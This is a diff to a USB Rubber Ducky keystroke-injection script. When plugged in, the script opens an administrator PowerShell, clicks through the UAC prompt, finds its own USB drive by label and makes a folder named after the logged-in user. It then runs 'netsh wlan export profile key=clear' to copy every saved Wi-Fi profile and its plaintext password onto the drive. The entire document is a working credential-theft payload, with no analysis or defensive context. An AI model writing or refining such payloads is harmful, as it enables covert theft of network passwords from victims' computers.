@@ -5,12 +5,19 @@ GUI r
 DELAY 750
 STRING powershell
 CTRL-SHIFT ENTER
+DELAY 750
+ALT y
 DELAY 500
-STRING for /f %d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do set myd=%d
-DELAY 50
+STRING $path = powershell "((Get-Volume -FileSystemLabel __).DriveLetter+':\')"
+ENTER
+STRING cd $path
+ENTER
+STRING mkdir $env:UserName
+ENTER
+STRING cd $env:UserName
 ENTER
 DELAY 300
-STRING netsh wlan export profile folder=%myd%\ key=clear
+STRING netsh wlan export profile key=clear
 ENTER
 DELAY 500
 STRING exit
